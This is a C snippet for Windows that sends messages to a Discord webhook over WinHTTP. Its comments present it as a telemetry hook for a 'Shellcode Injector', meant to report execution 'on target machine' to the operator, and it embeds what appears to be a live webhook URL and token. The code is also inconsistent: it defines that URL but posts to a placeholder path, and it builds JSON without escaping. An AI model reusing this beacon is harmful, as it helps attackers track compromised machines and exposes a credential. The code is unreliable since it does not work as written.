#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#pragma comment(lib, "winhttp.lib")

// REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
// Format: https://discord.com/api/webhooks/123456789/abcdefg
#define DISCORD_WEBHOOK_URL "https://discord.com/api/webhooks/1534571990781006085/lQOF-50-yQZtnUr4BxDwHyqJGkmjcZuXwjd0JqazKCfR0e9hu045Sp6u0jbBGf5QnmB0"

void send_discord_log(const char* message) {
    // Parse the URL to extract host and path
    const char* host = "discord.com";
    const char* path = "/api/webhooks/YOUR_ID/YOUR_TOKEN"; // Put your actual path here

    // Open a WinHTTP session
    HINTERNET hSession = WinHttpOpen(L"User-Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (hSession) {
        // Connect to discord.com
        HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            // Open a POST request
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/webhooks/YOUR_ID/YOUR_TOKEN", 
                                                    NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                // Build the JSON payload { "content": "your message" }
                char json[512];
                snprintf(json, sizeof(json), "{\"content\": \"%s\"}", message);

                // Set Headers
                LPCWSTR headers = L"Content-Type: application/json";
                
                // Send the request
                if (WinHttpSendRequest(hRequest, headers, wcslen(headers), 
                                       (LPVOID)json, strlen(json), strlen(json), 0)) {
                    WinHttpReceiveResponse(hRequest, NULL);
                    printf("[✅] Telemetry sent to Discord!\n");
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

// ----- INTEGRATE IT INTO YOUR SHOP -----
// Inside your simulate_shellcode() function, add this at the end:
// send_discord_log("🛠️ Shellcode Injector was executed on target machine.");